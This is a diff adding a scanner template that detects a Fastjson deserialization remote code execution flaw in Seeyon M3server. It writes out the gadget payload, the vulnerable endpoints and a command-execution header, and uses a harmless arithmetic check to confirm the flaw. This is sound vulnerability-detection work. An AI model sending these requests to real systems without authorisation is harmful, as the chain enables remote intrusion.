@@ -1,0 +1,54 @@
+id: seeyon-m3server-mobile-portal-rce
+info:
+  name: Seeyon M3server Fastjson RCE Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,fastjson,seeyon
+  description: |
+    This template detects a remote code execution (RCE) vulnerability in Seeyon M3server's mobile portal API via Fastjson deserialization.
+
+variables:
+  t1: "{{rand_int(10000, 99999)}}"
+  t2: "{{rand_int(1000, 10000)}}"
+  t3: "{{to_number(t1) * to_number(t2)}}"
+  command: |
+    "expr {{t1}} * {{t2}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: "1"
+    raw:
+      - |
+        POST /mobile_portal/api/pns/message/send/batch/6_1sp1 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        [{"userMessageId":"{\"@type\":\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\",\"userOverridesAsString\":\"HexAsciiSerializedMap:\"}","channelId":"111","title":"111","content":"222","deviceType":"androidphone","serviceProvider":"baidu","deviceFirm":"other"}]
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "Success"
+
+  - id: "2"
+    raw:
+      - |
+        GET /mobile_portal/api/systemLog/pns/loadLog/app.log HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        cmd: {{command}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "Success"
+          - "{{t3}}"
